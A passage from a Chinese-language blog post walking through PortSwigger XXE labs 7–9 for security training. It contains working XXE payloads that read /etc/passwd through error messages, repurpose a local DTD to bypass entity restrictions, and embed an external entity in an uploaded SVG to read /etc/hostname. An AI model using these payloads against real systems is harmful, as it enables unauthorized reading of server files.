+<p>搞不太懂，可能是回显的内容不符合 <code>/?x=%file;</code> 传给 exploit server 的格式。不过我都有回显了为啥还非得传到 exploit server 呢，直接看不香嘛？修改 payload，将要读取的文件变量与一个不存在的文件名拼接。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#x27;file:///caishao/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure>
+
+<p>原理是在后端访问到不存在的文件时会抛出异常，异常中可能会包含不存在文件的文件名，这里我们的文件名是：<code>file:///caishao/%file;</code> 也就是说，文件名中包含了整个 <code>/etc/passwd</code> 文件的内容，从而获取敏感信息。</p>
+<p>发送后，读取到 <code>/etc/passwd</code> 的文件内容。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705160322.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705160322.png"></a></p>
+<h1 id="8-expert-Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><a href="#8-expert-Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD" class="headerlink" title="8 (expert) Lab: Exploiting XXE to retrieve data by repurposing a local DTD"></a>8 (expert) Lab: Exploiting XXE to retrieve data by repurposing a local DTD</h1><p>本题仍然是一道 blind xxe，不过没有提供 exploit server 无法借助外部服务器 out-of-band 提取数据，所以只能基于报错利用。</p>
+<p>Hint 说本地 dtd 里有个 <code>/usr/share/yelp/dtd/docbookx.dtd</code>，其中有个实体叫做 <code>ISOamso</code>。</p>
+<p>对于内部 DTD（internal DTD），无法在一个参数实体中调用另一个参数实体，也就是说前面使用到的 <code>&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;file:///caishao/%file;&#39;&gt;</code> 不能奏效。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705171537.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705171537.png"></a></p>
+<p>报错信息 “ cannot occur within markup in the internal subset of the DTD.”</p>
+<p>思路：找一个本地 DTD 文件，重写里面的实体，由于 XML 实体的名字唯一，有两个名称相同的实体时，以第一个为准。之后引用该本地 DTD 文件，其中应该有调用这个实体的方式，继而获取敏感信息。本质上是借助本地 DTD 文件绕过 <strong>无法在一个参数实体中调用另一个参数实体</strong> 的限制。</p>
+<p>payload: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;&amp;#x25;eval; &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%local_dtd; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">productId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">productId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240705174009.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240705174009.png"></a></p>
+<h1 id="9-Lab-Exploiting-XXE-via-image-file-upload"><a href="#9-Lab-Exploiting-XXE-via-image-file-upload" class="headerlink" title="9 Lab: Exploiting XXE via image file upload"></a>9 Lab: Exploiting XXE via image file upload</h1><p>–&gt; <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload">传送门</a></p>
+<p>题目分析：</p>
+<ol>
+<li>评论部分允许用户上传头像，且头像由 Apache Batik 库解析。</li>
+<li>上传图片，获取 <code>/etc/hostname</code> 文件的内容。</li>
+</ol>
+<p>再根据 lab 上下文内容，应该是要上传一个 SVG 文件，因为 SVG 是基于 XML 的文件格式，可以在里面写入恶意 XML 实体，即可读取敏感信息。</p>
+<p>在此之前先学习下 SVG 格式，可以参考 adobe 的这篇文章 <a target="_blank" rel="noopener" href="https://www.adobe.com/creativecloud/file-types/image/vector/svg-file.html">SVG files.</a> SVG，全称是 Scalable Vector Graphics，是一种 web 友好的矢量文件格式。与 JPEG 这样基于像素的光栅文件格式不同，矢量文件通过网格上的点和线的数学关系来存储图像。由于没有使用像素，所以也无法很好的展示高品质数码相片。SVG 文件一般用来制作 LOGO，如下图 portswigger lab 的经典 LOGO 使用的就是 SVG 格式。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707103406.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707103406.png"></a></p>
+<p>对应的报文是这样的（好像跟上面不太对应，将就看吧 emmm</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707105034.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707105034.png"></a></p>
+<p>在网上随便找个 SVG 编辑器，注入恶意 xml 实体（后面发现其实直接改包就行）</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707110015.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707110015.png"></a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line">  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/hostname&quot;</span>&gt;</span> %xxe; ]&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- sample rectangle --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">x</span>=<span class="string">&quot;50&quot;</span> <span class="attr">y</span>=<span class="string">&quot;50&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上传头像后，http 请求报文是这样的。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707110343.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707110343.png"></a></p>
+<p>响应报错，状态码 500，从报错内容看，应该是获取到 <code>/etc/hostname</code> 的信息了，只是传不过来，要是给个 exploit server 就好了。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707110403.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707110403.png"></a></p>
+<p>刚我注入的是 parameter entities 参数实体，后面用普通外部实体注入，提示我评论成功了。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707111025.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707111025.png"></a></p>
+<p>不过怎么把我的头像整成 png 了？</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707111442.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707111442.png"></a></p>
+<p>上传个默认头像也被转成 png 了！！！岂可修</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707112456.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707112456.png"></a></p>
+<p>修改下 payload，将 &#x2F;etc&#x2F;hostname 的内容在转换成 PNG 之前写入 SVG。后端的逻辑应该是先渲染 SVG，然后以 PNG 形式存储和访问。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707114528.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707114528.png"></a></p>
+<p>访问头像文件，结束。</p>
+<p><a data-fancybox="gallery" data-src="/images/2024/07/09/Pasted_image_20240707114721.png" data-caption=""><img src="/images/2024/07/09/Pasted_image_20240707114721.png"></a></p>
+<p><strong>Portswigger XXE 的九个 lab 全部做完啦，完结撒花！！！</strong></p>
+
+  </div>
+
+  <!-- 版权声明 -->
+  
+
+
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><span class="toc-number">1.</span> <span class="toc-text">1 Lab: Exploiting XXE using external entities to retrieve files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Lab-Exploiting-XXE-to-perform-SSRF-attacks"><span class="toc-number">2.</span> <span class="toc-text">2 Lab: Exploiting XXE to perform SSRF attacks</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Lab-Exploiting-XInclude-to-retrieve-files"><span class="toc-number">3.</span> <span class="toc-text">3 Lab: Exploiting XInclude to retrieve files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-Lab-Blind-XXE-with-out-of-band-interaction"><span class="toc-number">4.</span> <span class="toc-text">4 Lab: Blind XXE with out-of-band interaction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities"><span class="toc-number">5.</span> <span class="toc-text">5 Lab: Blind XXE with out-of-band interaction via XML parameter entities</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-Lab-Exploiting-blind-XXE-to-exfiltrate-data-using-a-malicious-external-DTD"><span class="toc-number">6.</span> <span class="toc-text">6 Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-Lab-Exploiting-blind-XXE-to-retrieve-data-via-error-messages"><span class="toc-number">7.</span> <span class="toc-text">7 Lab: Exploiting blind XXE to retrieve data via error messages</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-expert-Lab-Exploiting-XXE-to-retrieve-data-by-repurposing-a-local-DTD"><span class="toc-number">8.</span> <span class="toc-text">8 (expert) Lab: Exploiting XXE to retrieve data by repurposing a local DTD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-Lab-Exploiting-XXE-via-image-file-upload"><span class="toc-number">9.</span> <span class="toc-text">9 Lab: Exploiting XXE via image file upload</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://by-musi.github.io/2024/07/09/PortSwigger_XXEi_labs/&title=PortSwigger XXEi labs"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    CaiShao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider"> | </span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'BY-musi/BY-musi.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'comment';
+      var utterances_theme = 'photon-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+
+<!-- FancyBox -->
+
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+  <script>
+    Fancybox.bind('[data-fancybox="gallery"]', {
+      //
+    });    
+  </script>
+
+
+<!-- Copyright -->
+
+</body>
+</html>
